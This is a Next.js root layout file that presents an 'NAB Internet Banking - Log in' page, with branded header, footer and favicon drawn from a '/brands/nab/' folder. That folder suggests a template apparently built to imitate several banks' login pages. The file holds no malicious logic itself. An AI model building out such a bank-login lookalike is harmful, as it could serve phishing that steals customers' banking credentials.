import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";
import Script from "next/script";
import { NABHeader } from "@/components/layout/NABHeader";
import { NABFooter } from "@/components/layout/NABFooter";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "NAB Internet Banking - Log in",
  description: "Log in to NAB Internet Banking",
  icons: {
    icon: '/brands/nab/favicon.svg',
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
      >
        <Script src="/config.js" strategy="beforeInteractive" />

        <div className="background-layer"></div>

        <div className="page-wrapper">
          <NABHeader />

          <main className="main-content">
            <div className="content-inner">
              {children}
            </div>
          </main>

          <NABFooter />
        </div>
      </body>
    </html>
  );
}
